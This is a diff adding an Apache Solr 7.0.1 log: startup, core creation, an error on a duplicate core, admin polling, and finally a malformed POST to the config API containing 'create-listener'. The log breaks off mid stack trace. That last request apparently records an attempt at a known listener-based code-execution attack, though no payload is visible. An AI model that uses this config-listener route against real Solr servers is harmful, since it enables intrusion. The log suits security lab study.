@@ -1,0 +1,903 @@
+2020-03-26 02:56:24.200 INFO  (main) [   ] o.e.j.s.Server jetty-9.3.14.v20161028
+2020-03-26 02:56:25.737 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter  ___      _       Welcome to Apache Solr? version 7.0.1
+2020-03-26 02:56:25.739 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter / __| ___| |_ _   Starting in standalone mode on port 8983
+2020-03-26 02:56:25.739 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter \__ \/ _ \ | '_|  Install dir: /usr/local/solr-7.0.1, Default config dir: /usr/local/solr-7.0.1/server/solr/configsets/_default/conf
+2020-03-26 02:56:25.842 INFO  (main) [   ] o.a.s.s.SolrDispatchFilter |___/\___/_|_|    Start time: 2020-03-26T02:56:25.764Z
+2020-03-26 02:56:25.844 INFO  (main) [   ] o.a.s.s.StartupLoggingUtils Property solr.log.muteconsole given. Muting ConsoleAppender named CONSOLE
+2020-03-26 02:56:25.937 INFO  (main) [   ] o.a.s.c.SolrResourceLoader Using system property solr.solr.home: /usr/local/solr-7.0.1/server/solr
+2020-03-26 02:56:25.969 INFO  (main) [   ] o.a.s.c.SolrXmlConfig Loading container configuration from /usr/local/solr-7.0.1/server/solr/solr.xml
+2020-03-26 02:56:29.603 INFO  (main) [   ] o.a.s.c.CorePropertiesLocator Found 0 core definitions underneath /usr/local/solr-7.0.1/server/solr
+2020-03-26 02:56:29.875 INFO  (main) [   ] o.e.j.s.Server Started @8189ms
+2020-03-26 02:56:47.052 INFO  (qtp12209492-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json} status=0 QTime=164
+2020-03-26 02:56:47.163 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json} status=0 QTime=27
+2020-03-26 02:56:47.196 INFO  (qtp12209492-14) [   ] o.a.s.c.TransientSolrCoreCacheDefault Allocating transient cache for 2147483647 transient cores
+2020-03-26 02:56:47.198 INFO  (qtp12209492-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={core=core1&action=STATUS&wt=json} status=0 QTime=9
+2020-03-26 02:56:47.364 INFO  (qtp12209492-12) [   ] o.a.s.h.a.CoreAdminOperation core create command name=core1&action=CREATE&instanceDir=core1&wt=json
+2020-03-26 02:56:47.606 INFO  (qtp12209492-12) [   x:core1] o.a.s.c.SolrResourceLoader [core1] Added 51 libs to classloader, from paths: [/usr/local/solr-7.0.1/contrib/clustering/lib, /usr/local/solr-7.0.1/contrib/extraction/lib, /usr/local/solr-7.0.1/contrib/langid/lib, /usr/local/solr-7.0.1/contrib/velocity/lib, /usr/local/solr-7.0.1/dist]
+2020-03-26 02:56:48.247 INFO  (qtp12209492-12) [   x:core1] o.a.s.c.SolrConfig Using Lucene MatchVersion: 7.0.1
+2020-03-26 02:56:48.760 INFO  (qtp12209492-12) [   x:core1] o.a.s.s.IndexSchema [core1] Schema name=default-config
+2020-03-26 02:56:50.397 INFO  (qtp12209492-12) [   x:core1] o.a.s.s.IndexSchema Loaded schema default-config/1.6 with uniqueid field id
+2020-03-26 02:56:50.512 INFO  (qtp12209492-12) [   x:core1] o.a.s.c.CoreContainer Creating SolrCore 'core1' using configuration from instancedir /usr/local/solr-7.0.1/server/solr/core1, trusted=true
+2020-03-26 02:56:50.554 INFO  (qtp12209492-12) [   x:core1] o.a.s.c.SolrCore solr.RecoveryStrategy.Builder
+2020-03-26 02:56:50.568 INFO  (qtp12209492-12) [   x:core1] o.a.s.c.SolrCore [[core1] ] Opening new SolrCore at [/usr/local/solr-7.0.1/server/solr/core1], dataDir=[/usr/local/solr-7.0.1/server/solr/core1/data/]
+2020-03-26 02:56:51.018 INFO  (qtp12209492-12) [   x:core1] o.a.s.r.XSLTResponseWriter xsltCacheLifetimeSeconds=5
+2020-03-26 02:56:52.144 INFO  (qtp12209492-12) [   x:core1] o.a.s.u.UpdateHandler Using UpdateLog implementation: org.apache.solr.update.UpdateLog
+2020-03-26 02:56:52.144 INFO  (qtp12209492-12) [   x:core1] o.a.s.u.UpdateLog Initializing UpdateLog: dataDir= defaultSyncLevel=FLUSH numRecordsToKeep=100 maxNumLogsToKeep=10 numVersionBuckets=65536
+2020-03-26 02:56:52.201 INFO  (qtp12209492-12) [   x:core1] o.a.s.u.CommitTracker Hard AutoCommit: if uncommited for 15000ms; 
+2020-03-26 02:56:52.201 INFO  (qtp12209492-12) [   x:core1] o.a.s.u.CommitTracker Soft AutoCommit: disabled
+2020-03-26 02:56:52.259 INFO  (qtp12209492-12) [   x:core1] o.a.s.s.SolrIndexSearcher Opening [Searcher@f00bb25[core1] main]
+2020-03-26 02:56:52.294 INFO  (qtp12209492-12) [   x:core1] o.a.s.r.ManagedResourceStorage File-based storage initialized to use dir: /usr/local/solr-7.0.1/server/solr/core1/conf
+2020-03-26 02:56:52.352 INFO  (qtp12209492-12) [   x:core1] o.a.s.h.c.SpellCheckComponent Initializing spell checkers
+2020-03-26 02:56:52.395 INFO  (qtp12209492-12) [   x:core1] o.a.s.s.DirectSolrSpellChecker init: {name=default,field=_text_,classname=solr.DirectSolrSpellChecker,distanceMeasure=internal,accuracy=0.5,maxEdits=2,minPrefix=1,maxInspections=5,minQueryLength=4,maxQueryFrequency=0.01}
+2020-03-26 02:56:52.452 INFO  (qtp12209492-12) [   x:core1] o.a.s.h.ReplicationHandler Commits will be reserved for  10000
+2020-03-26 02:56:52.613 INFO  (searcherExecutor-7-thread-1-processing-x:core1) [   x:core1] o.a.s.c.QuerySenderListener QuerySenderListener sending requests to Searcher@f00bb25[core1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 02:56:52.613 INFO  (searcherExecutor-7-thread-1-processing-x:core1) [   x:core1] o.a.s.c.QuerySenderListener QuerySenderListener done.
+2020-03-26 02:56:52.614 INFO  (searcherExecutor-7-thread-1-processing-x:core1) [   x:core1] o.a.s.h.c.SpellCheckComponent Loading spell index for spellchecker: default
+2020-03-26 02:56:52.630 INFO  (qtp12209492-12) [   x:core1] o.a.s.u.UpdateLog Could not find max version in index or recent updates, using new clock 1662193670688866304
+2020-03-26 02:56:52.634 INFO  (searcherExecutor-7-thread-1-processing-x:core1) [   x:core1] o.a.s.c.SolrCore [core1] Registered new searcher Searcher@f00bb25[core1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 02:56:52.667 INFO  (qtp12209492-12) [   x:core1] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={name=core1&action=CREATE&instanceDir=core1&wt=json} status=0 QTime=5303
+2020-03-26 03:02:16.225 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json} status=0 QTime=40
+2020-03-26 03:02:16.427 INFO  (qtp12209492-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json} status=0 QTime=107
+2020-03-26 03:02:16.588 INFO  (qtp12209492-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={core=te1&action=STATUS&wt=json} status=0 QTime=2
+2020-03-26 03:02:16.874 INFO  (qtp12209492-13) [   ] o.a.s.h.a.CoreAdminOperation core create command name=te1&action=CREATE&instanceDir=te1&wt=json
+2020-03-26 03:02:17.098 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrResourceLoader [te1] Added 51 libs to classloader, from paths: [/usr/local/solr-7.0.1/contrib/clustering/lib, /usr/local/solr-7.0.1/contrib/extraction/lib, /usr/local/solr-7.0.1/contrib/langid/lib, /usr/local/solr-7.0.1/contrib/velocity/lib, /usr/local/solr-7.0.1/dist]
+2020-03-26 03:02:17.209 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrConfig Using Lucene MatchVersion: 7.0.1
+2020-03-26 03:02:17.419 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.IndexSchema [te1] Schema name=default-config
+2020-03-26 03:02:18.466 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.IndexSchema Loaded schema default-config/1.6 with uniqueid field id
+2020-03-26 03:02:18.573 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.CoreContainer Creating SolrCore 'te1' using configuration from instancedir /usr/local/solr-7.0.1/server/solr/te1, trusted=true
+2020-03-26 03:02:18.575 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrCore solr.RecoveryStrategy.Builder
+2020-03-26 03:02:18.575 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.SolrCore [[te1] ] Opening new SolrCore at [/usr/local/solr-7.0.1/server/solr/te1], dataDir=[/usr/local/solr-7.0.1/server/solr/te1/data/]
+2020-03-26 03:02:18.603 INFO  (qtp12209492-13) [   x:te1] o.a.s.r.XSLTResponseWriter xsltCacheLifetimeSeconds=5
+2020-03-26 03:02:18.780 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.UpdateHandler Using UpdateLog implementation: org.apache.solr.update.UpdateLog
+2020-03-26 03:02:18.787 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.UpdateLog Initializing UpdateLog: dataDir= defaultSyncLevel=FLUSH numRecordsToKeep=100 maxNumLogsToKeep=10 numVersionBuckets=65536
+2020-03-26 03:02:18.884 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.CommitTracker Hard AutoCommit: if uncommited for 15000ms; 
+2020-03-26 03:02:19.017 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.CommitTracker Soft AutoCommit: disabled
+2020-03-26 03:02:19.023 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.SolrIndexSearcher Opening [Searcher@121abe2c[te1] main]
+2020-03-26 03:02:19.027 INFO  (qtp12209492-13) [   x:te1] o.a.s.r.ManagedResourceStorage File-based storage initialized to use dir: /usr/local/solr-7.0.1/server/solr/te1/conf
+2020-03-26 03:02:19.062 INFO  (qtp12209492-13) [   x:te1] o.a.s.h.c.SpellCheckComponent Initializing spell checkers
+2020-03-26 03:02:19.063 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.DirectSolrSpellChecker init: {name=default,field=_text_,classname=solr.DirectSolrSpellChecker,distanceMeasure=internal,accuracy=0.5,maxEdits=2,minPrefix=1,maxInspections=5,minQueryLength=4,maxQueryFrequency=0.01}
+2020-03-26 03:02:19.069 INFO  (qtp12209492-13) [   x:te1] o.a.s.h.ReplicationHandler Commits will be reserved for  10000
+2020-03-26 03:02:19.081 INFO  (qtp12209492-13) [   x:te1] o.a.s.u.UpdateLog Could not find max version in index or recent updates, using new clock 1662194012998598656
+2020-03-26 03:02:19.083 INFO  (searcherExecutor-12-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener sending requests to Searcher@121abe2c[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 03:02:19.131 INFO  (searcherExecutor-12-thread-1-processing-x:te1) [   x:te1] o.a.s.c.QuerySenderListener QuerySenderListener done.
+2020-03-26 03:02:19.131 INFO  (searcherExecutor-12-thread-1-processing-x:te1) [   x:te1] o.a.s.h.c.SpellCheckComponent Loading spell index for spellchecker: default
+2020-03-26 03:02:19.137 INFO  (searcherExecutor-12-thread-1-processing-x:te1) [   x:te1] o.a.s.c.SolrCore [te1] Registered new searcher Searcher@121abe2c[te1] main{ExitableDirectoryReader(UninvertingDirectoryReader())}
+2020-03-26 03:02:19.141 INFO  (qtp12209492-13) [   x:te1] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={name=te1&action=CREATE&instanceDir=te1&wt=json} status=0 QTime=2266
+2020-03-26 03:03:38.047 INFO  (qtp12209492-18) [   ] o.a.s.h.a.CoreAdminOperation core create command name=te1&action=CREATE&instanceDir=te1
+2020-03-26 03:03:38.048 WARN  (qtp12209492-18) [   ] o.a.s.c.CoreContainer Creating a core with existing name is not allowed
+2020-03-26 03:03:38.099 ERROR (qtp12209492-18) [   ] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Core with name 'te1' already exists.
+	at org.apache.solr.core.CoreContainer.create(CoreContainer.java:898)
+	at org.apache.solr.handler.admin.CoreAdminOperation.lambda$static$0(CoreAdminOperation.java:91)
+	at org.apache.solr.handler.admin.CoreAdminOperation.execute(CoreAdminOperation.java:384)
+	at org.apache.solr.handler.admin.CoreAdminHandler$CallInfo.call(CoreAdminHandler.java:389)
+	at org.apache.solr.handler.admin.CoreAdminHandler.handleRequestBody(CoreAdminHandler.java:174)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.servlet.HttpSolrCall.handleAdmin(HttpSolrCall.java:745)
+	at org.apache.solr.servlet.HttpSolrCall.handleAdminRequest(HttpSolrCall.java:726)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:507)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:03:38.100 INFO  (qtp12209492-18) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={name=te1&action=CREATE&instanceDir=te1} status=500 QTime=52
+2020-03-26 03:03:38.118 ERROR (qtp12209492-18) [   ] o.a.s.s.HttpSolrCall null:org.apache.solr.common.SolrException: Core with name 'te1' already exists.
+	at org.apache.solr.core.CoreContainer.create(CoreContainer.java:898)
+	at org.apache.solr.handler.admin.CoreAdminOperation.lambda$static$0(CoreAdminOperation.java:91)
+	at org.apache.solr.handler.admin.CoreAdminOperation.execute(CoreAdminOperation.java:384)
+	at org.apache.solr.handler.admin.CoreAdminHandler$CallInfo.call(CoreAdminHandler.java:389)
+	at org.apache.solr.handler.admin.CoreAdminHandler.handleRequestBody(CoreAdminHandler.java:174)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.servlet.HttpSolrCall.handleAdmin(HttpSolrCall.java:745)
+	at org.apache.solr.servlet.HttpSolrCall.handleAdminRequest(HttpSolrCall.java:726)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:507)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:04:01.372 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=2
+2020-03-26 03:04:01.726 INFO  (qtp12209492-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=356
+2020-03-26 03:04:01.729 INFO  (qtp12209492-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=364
+2020-03-26 03:04:07.317 INFO  (qtp12209492-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:07.511 INFO  (qtp12209492-37) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/replication params={wt=json&command=details&_=1585191847283} status=0 QTime=178
+2020-03-26 03:04:07.521 INFO  (qtp12209492-18) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/luke params={numTerms=0&show=index&wt=json&_=1585191847282} status=0 QTime=189
+2020-03-26 03:04:07.534 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=206
+2020-03-26 03:04:07.518 INFO  (qtp12209492-16) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/ping params={action=status&wt=json&_=1585191837581&ts=1585191837581} status=503 QTime=139
+2020-03-26 03:04:07.590 INFO  (qtp12209492-13) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/system params={wt=json&_=1585191847282} status=0 QTime=240
+2020-03-26 03:04:10.179 INFO  (qtp12209492-14) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:10.313 INFO  (qtp12209492-19) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/luke params={show=schema&wt=json&_=1585191847282} status=0 QTime=114
+2020-03-26 03:04:10.331 INFO  (qtp12209492-12) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=146
+2020-03-26 03:04:13.711 INFO  (qtp12209492-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:13.730 INFO  (qtp12209492-20) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/mbeans params={cat=QUERY&wt=json&_=1585191853637} status=0 QTime=1
+2020-03-26 03:04:13.746 INFO  (qtp12209492-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=23
+2020-03-26 03:04:13.880 INFO  (qtp12209492-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:13.901 INFO  (qtp12209492-37) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/mbeans params={cat=QUERY&wt=json&_=1585191853637} status=0 QTime=5
+2020-03-26 03:04:13.945 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=53
+2020-03-26 03:04:17.841 INFO  (qtp12209492-20) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:17.881 INFO  (qtp12209492-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=30
+2020-03-26 03:04:17.887 INFO  (qtp12209492-16) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/luke params={show=schema&wt=json&_=1585191847282} status=0 QTime=7
+2020-03-26 03:04:19.780 INFO  (qtp12209492-37) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:19.787 INFO  (qtp12209492-37) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/mbeans params={cat=QUERY&wt=json&_=1585191853637} status=0 QTime=0
+2020-03-26 03:04:19.806 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=21
+2020-03-26 03:04:20.007 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:20.024 INFO  (qtp12209492-18) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/mbeans params={cat=QUERY&wt=json&_=1585191853637} status=0 QTime=3
+2020-03-26 03:04:20.049 INFO  (qtp12209492-13) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=36
+2020-03-26 03:04:20.973 INFO  (qtp12209492-17) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:20.990 INFO  (qtp12209492-37) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/luke params={show=schema&wt=json&_=1585191847282} status=0 QTime=3
+2020-03-26 03:04:21.034 INFO  (qtp12209492-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=56
+2020-03-26 03:04:22.218 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585191837578} status=0 QTime=0
+2020-03-26 03:04:22.235 INFO  (qtp12209492-19) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/luke params={numTerms=0&show=index&wt=json&_=1585191847282} status=0 QTime=0
+2020-03-26 03:04:22.237 INFO  (qtp12209492-14) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/replication params={wt=json&command=details&_=1585191847283} status=0 QTime=1
+2020-03-26 03:04:22.247 INFO  (qtp12209492-19) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/ping params={action=status&wt=json&_=1585191837581&ts=1585191837581} status=503 QTime=4
+2020-03-26 03:04:22.270 INFO  (qtp12209492-12) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585191837581} status=0 QTime=49
+2020-03-26 03:04:22.310 INFO  (qtp12209492-18) [   x:core1] o.a.s.c.S.Request [core1]  webapp=/solr path=/admin/system params={wt=json&_=1585191847282} status=0 QTime=68
+2020-03-26 03:13:54.535 INFO  (qtp12209492-38) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=0
+2020-03-26 03:13:54.964 INFO  (qtp12209492-16) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=400
+2020-03-26 03:13:54.964 INFO  (qtp12209492-19) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=408
+2020-03-26 03:15:10.097 INFO  (qtp12209492-37) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/cores params={indexInfo=false&wt=json&_=1585192434039} status=0 QTime=0
+2020-03-26 03:15:11.048 INFO  (qtp12209492-12) [   ] o.a.s.s.HttpSolrCall [admin] webapp=null path=/admin/info/system params={wt=json&_=1585192434043} status=0 QTime=69
+2020-03-26 03:15:11.731 INFO  (qtp12209492-38) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/replication params={wt=json&command=details&_=1585192504747} status=0 QTime=121
+2020-03-26 03:15:12.222 INFO  (qtp12209492-19) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/admin/luke params={numTerms=0&show=index&wt=json&_=1585192504744} status=0 QTime=32
+2020-03-26 03:15:12.789 INFO  (qtp12209492-16) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/admin/ping params={action=status&wt=json&_=1585192434043&ts=1585192434043} status=503 QTime=2
+2020-03-26 03:15:13.489 INFO  (qtp12209492-38) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/admin/system params={wt=json&_=1585192504745} status=0 QTime=60
+2020-03-26 03:18:45.294 ERROR (qtp12209492-37) [   x:te1] o.a.s.h.RequestHandlerBase org.noggit.JSONParser$ParseException: Expected ',' or '}': char={,position=78 AFTER=' Content-Type:application/json Content-Length:313 {' BEFORE=' "create-listener": { '
+	at org.noggit.JSONParser.err(JSONParser.java:419)
+	at org.noggit.JSONParser.nextEvent(JSONParser.java:1074)
+	at org.apache.solr.common.util.CommandOperation.parse(CommandOperation.java:280)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:347)
+	at org.apache.solr.common.util.CommandOperation.readCommands(CommandOperation.java:324)
+	at org.apache.solr.handler.SolrConfigHandler$Command.handlePOST(SolrConfigHandler.java:334)
+	at org.apache.solr.handler.SolrConfigHandler$Command.access$100(SolrConfigHandler.java:159)
+	at org.apache.solr.handler.SolrConfigHandler.handleRequestBody(SolrConfigHandler.java:137)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:177)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
